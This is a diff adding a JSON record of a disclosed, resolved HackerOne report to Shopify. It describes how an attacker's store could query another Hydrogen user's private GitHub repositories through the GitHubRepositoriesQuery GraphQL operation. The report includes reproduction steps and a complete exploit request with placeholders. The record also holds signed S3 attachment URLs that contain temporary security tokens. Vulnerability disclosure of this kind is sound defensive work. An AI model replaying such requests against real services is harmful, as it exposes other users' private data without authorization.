@@ -1,0 +1,149 @@
+{
+  "id": 1692788,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjkyNzg4",
+  "url": "https://hackerone.com/reports/1692788",
+  "title": "Attacker is able to query Github repositories of arbitrary Shopify Hydrogen Users ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2022-09-06T21:15:39.683Z",
+  "submitted_at": "2022-09-06T21:15:39.916Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kun_19",
+    "url": "/kun_19",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-03-09T18:45:57.372Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-01-23T16:09:23.554Z",
+  "team_member_agreed_on_going_public_at": "2023-03-09T18:45:57.222Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nShopify Hydrogen is a framework (based on React) that let you build personalized custom storefronts in a performant way. The Hydrogen app from the Shopify App Store supports to create a custom storefront with the Hydrogen framework (initial setup, deployment to Oxygen, etc.). Therefore, the user has to connect his GitHub account to the Hydrogen App.\nAn attacker is able to query the GitHub account / the private repositories of any Hydrogen user.\n\n## Shops Used to Test:\nhttps://19kun-27.myshopify.com (Victim) (Shopify Plus Store)\nhttps://19kun-19.myshopify.com (Attacker) (Development Store)\n\n## Steps To Reproduce:\n\n  1.  (Victim) Create a Shopify Plus store and install the Hydrogen app from the Shopify App Store  (https://apps.shopify.com/hydrogen)\n  2.  (Victim) Open the Hydrogen app and connect  a  Github account (make sure the Github account has several private repositories)\n  3. (Victim) Click on \"Create Storefront\":  \n{F1910344}\n  4. (Victim) You should now see the connected GitHub account, including the private repositories:  \n{F1910353}\n  5. (Victim) In the background some HTTP requests are sent to the server, including to the vulnerable GraphQL operation **GitHubRepositoriesQuery**. Remember the `ownerName` and the `ownerId` of the victim for exploitation:  \n████\n  6. (Attacker) Log in to your store (e.g. a development store) and send following request with your attacker account to the server. Replace  the `<OWNER_NAME>` and `<OWNER_ID>` of the victim from the previous step and also replace the other placeholders `<ATTACKER_SHOPIFY_DOMAIN>`, `<COOKIES_ATTACKER>` and `<CSRF_TOKEN_ATTACKER>`:  \n```\nPOST /admin/internal/web/graphql/core?operation=GitHubRepositoriesQuery&type=query HTTP/2\nHost: <ATTACKER_SHOPIFY_DOMAIN>\nCookie: <COOKIES_ATTACKER>\nContent-Length: 778\nSec-Ch-Ua: \"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"\nX-Csrf-Token: <CSRF_TOKEN_ATTACKER>\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36\nContent-Type: application/json\nAccept: application/json\nX-Shopify-Web-Force-Proxy: 1\nSec-Ch-Ua-Platform: \"macOS\"\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\n\n{\n   \"operationName\":\"GitHubRepositoriesQuery\",\n   \"variables\":{\n      \"ownerName\":\"<OWNER_NAME>\",\n      \"ownerId\":<OWNER_ID>,\n      \"searchQuery\":\"\",\n      \"pageSize\":15\n   },\n   \"query\":\"query GitHubRepositoriesQuery($ownerName: String!, $ownerId: Int, $searchQuery: String, $pageSize: Int, $cursor: String) {\\n  onlineStore {\\n    versionControlGithub {\\n      repositories(\\n        ownerName: $ownerName\\n        ownerId: $ownerId\\n        first: $pageSize\\n        searchQuery: $searchQuery\\n        after: $cursor\\n      ) {\\n        totalCount\\n        endCursor\\n        hasNextPage\\n        nodes {\\n          id\\n          name\\n          description\\n          writeAccess\\n          defaultBranchName\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n``` \n  7. (Attacker) The attacker should now be able to see the private repositories of the victim in the server's response (like in ████)\n\n## Impact\n\nAn attacker is able to use the GitHub access token of arbitrary users to get private information about the connected GitHub account (e.g. private repositories)",
+  "bounty_amount": "900.0",
+  "formatted_bounty": "$900",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1910344,
+      "file_name": "create_storefront.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ne7r5k58vnv3ibupfllb3w1x5283?response-content-disposition=attachment%3B%20filename%3D%22create_storefront.png%22%3B%20filename%2A%3DUTF-8%27%27create_storefront.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCRTVIE4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143002Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCeQctGyPvXnU72NvGUmvM0aB0iR%2B3ReIxYE2qLCiw2VwIgQyic82Noq%2FQNRIacH8SD9YwyMLSzJUY5PD%2BMQxm42%2BcqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDD25y2JUZlJK2OU6WyqPBbg7l2HIPDSTaxIUZJJDn8Tn6trTptA2U5ZbpvAD8y4VG9UTF74IWjDh5l48opUUNg3Ggdv3v9pPRorgEeg%2Bt0cTVcBC3Ys8DZw9zxbNGscUvnMasc%2F9jEoPGSi%2F0qA394vVOztSTMWH%2FQRDmRDVzGe3OFxSG%2FKiCccLhDQQlNz4rNDgXi84UTa%2FJIf4%2B7wo5Sl9EkosiQSbG9bQkoJ3LCJ8wo949ry1xJnm8q3NSNvhmiSoqkPYuY0L%2B2VOl9cKxyFN6OpJFga4OKej9TD%2B5Mr9tCXDx2U4PCtxvzg1hL2Qun61lgsZLsZXWc%2F64G%2BcDMMsm0TL%2F8%2FYCO0GhFuQEEE8KHX4jcyQxQ%2BXybMwMuwJwGKTeYQgtTcJf1GJd4CVc6kprwM9ROPdonqZ7dtJfnEAztxRMBvTfRaW5ao6yR%2Fu8JBGbTOt9IDtJCqWjvU16m%2B2Xu%2B1NkHIeLQSZc42z5hKqBV6TfV%2BEoPyEVoHwmSugFJGYxlFO%2Fk9DHGpdGrOSCua0MzJ4Xm8ofejJGoEo62Z2Gfa4TF77cdudEiHTttH42gVWBfO5nG1sldCBkJy7XROJmAnRjOEz5GXa2D4P80Z3%2B7b79AhZyv9wpFpH4efOyAISK%2BUO4SuPEZIEtgzMpfzbfHFxiCJadaIb6dvicqxJbWD7XbkPKUPQTvBkeeCE943JpFNhptae73cB3ht5kmPs1eumBkkaOvtfLFjTAZEHBy8VDu9DQZbXsvXwTvu0dJsQ7ofJrR8%2BwEoUsAoSnSjY7fDzJ%2FJ%2FQWK1yOgQuqVuuEYWszzzH%2B8eP8c%2FCNpNvzhbftjVLhLeHc8OUYyxPANiPV7oh4iSx1MWdK9zHhH0Su6fGdkvHp9Pnyj1Pkwo%2FGtrgY6sQGGpYHfkhc%2F8vURSuovK%2F%2By75LlcMpKqtpNNZno5zr0R%2FX3RqbysXt6ZptOpV0W2W2Z4mtk3N79Mh9ch1InfVgL%2BwzQtS9%2B%2BIdvzw4x5m1yDnpnpA9IZoAA54fDHmDQkUeA9BqYpB6wpQ%2FR%2Bh%2FiGk4bWWRP6iSQusKWzeUSUN7FFbJhU%2FacXW5iO1svwbp7%2FHDesFAT9RFD7Ji6uHPRq08cmTFvN7TosaU3np%2BACQQzbYE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a42512024343b278131f00a330d5e4a90439f18afdd9f413ba3de179f9e8acd",
+      "file_size": 733081,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1910353,
+      "file_name": "connect_repository.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xsdyp7heeobsb6350xjgj3nz8yb7?response-content-disposition=attachment%3B%20filename%3D%22connect_repository.png%22%3B%20filename%2A%3DUTF-8%27%27connect_repository.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCRTVIE4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143002Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCeQctGyPvXnU72NvGUmvM0aB0iR%2B3ReIxYE2qLCiw2VwIgQyic82Noq%2FQNRIacH8SD9YwyMLSzJUY5PD%2BMQxm42%2BcqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDD25y2JUZlJK2OU6WyqPBbg7l2HIPDSTaxIUZJJDn8Tn6trTptA2U5ZbpvAD8y4VG9UTF74IWjDh5l48opUUNg3Ggdv3v9pPRorgEeg%2Bt0cTVcBC3Ys8DZw9zxbNGscUvnMasc%2F9jEoPGSi%2F0qA394vVOztSTMWH%2FQRDmRDVzGe3OFxSG%2FKiCccLhDQQlNz4rNDgXi84UTa%2FJIf4%2B7wo5Sl9EkosiQSbG9bQkoJ3LCJ8wo949ry1xJnm8q3NSNvhmiSoqkPYuY0L%2B2VOl9cKxyFN6OpJFga4OKej9TD%2B5Mr9tCXDx2U4PCtxvzg1hL2Qun61lgsZLsZXWc%2F64G%2BcDMMsm0TL%2F8%2FYCO0GhFuQEEE8KHX4jcyQxQ%2BXybMwMuwJwGKTeYQgtTcJf1GJd4CVc6kprwM9ROPdonqZ7dtJfnEAztxRMBvTfRaW5ao6yR%2Fu8JBGbTOt9IDtJCqWjvU16m%2B2Xu%2B1NkHIeLQSZc42z5hKqBV6TfV%2BEoPyEVoHwmSugFJGYxlFO%2Fk9DHGpdGrOSCua0MzJ4Xm8ofejJGoEo62Z2Gfa4TF77cdudEiHTttH42gVWBfO5nG1sldCBkJy7XROJmAnRjOEz5GXa2D4P80Z3%2B7b79AhZyv9wpFpH4efOyAISK%2BUO4SuPEZIEtgzMpfzbfHFxiCJadaIb6dvicqxJbWD7XbkPKUPQTvBkeeCE943JpFNhptae73cB3ht5kmPs1eumBkkaOvtfLFjTAZEHBy8VDu9DQZbXsvXwTvu0dJsQ7ofJrR8%2BwEoUsAoSnSjY7fDzJ%2FJ%2FQWK1yOgQuqVuuEYWszzzH%2B8eP8c%2FCNpNvzhbftjVLhLeHc8OUYyxPANiPV7oh4iSx1MWdK9zHhH0Su6fGdkvHp9Pnyj1Pkwo%2FGtrgY6sQGGpYHfkhc%2F8vURSuovK%2F%2By75LlcMpKqtpNNZno5zr0R%2FX3RqbysXt6ZptOpV0W2W2Z4mtk3N79Mh9ch1InfVgL%2BwzQtS9%2B%2BIdvzw4x5m1yDnpnpA9IZoAA54fDHmDQkUeA9BqYpB6wpQ%2FR%2Bh%2FiGk4bWWRP6iSQusKWzeUSUN7FFbJhU%2FacXW5iO1svwbp7%2FHDesFAT9RFD7Ji6uHPRq08cmTFvN7TosaU3np%2BACQQzbYE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a33232926e40f7b44b19d10a23cd28439d43589ba97e10f1e63c97ada249e883",
+      "file_size": 293802,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 13,
+  "voters": [
+    "nicochess",
+    "shreyaschavhan",
+    "zy9ard3",
+    "ali",
+    "shubham_srt",
+    "dilawer",
+    "mattberg",
+    "shivammusic",
+    "moon_walk",
+    "dotol",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 413,
+    "asset_type": "URL",
+    "asset_identifier": "your-store.myshopify.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
